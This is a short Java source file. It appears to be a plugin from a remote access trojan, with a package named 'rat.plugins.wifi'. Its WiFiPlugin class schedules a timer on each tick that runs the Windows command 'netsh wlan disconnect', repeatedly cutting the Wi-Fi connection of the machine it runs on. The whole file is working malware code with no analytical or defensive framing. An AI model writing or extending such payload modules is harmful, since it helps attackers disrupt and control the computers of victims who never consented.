package rat.plugins.wifi;

import rat.plugins.AbstractPlugin;
import rat.plugins.command.CommandHandler;
import rat.plugins.command.CommandTask;

import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;

public class WiFiPlugin extends AbstractPlugin
{
    private long duration;

    private Timer timer;

    private AtomicBoolean done = new AtomicBoolean(true);

    public WiFiPlugin(long duration)
    {
        this.duration = duration;
        this.timer = new Timer();
    }

    @Override
    public byte getByte()
    {
        return 2;
    }

    @Override
    public void initialize()
    {
        //nothing
    }

    @Override
    public void onTick()
    {
        if (done.get())
        {
            done.set(false);

            timer.schedule(new TimerTask()
            {
                @Override
                public void run()
                {
                    CommandHandler.callCommand("netsh wlan disconnect", null);
                    done.set(true);
                }
            }, duration);
        }
    }
}
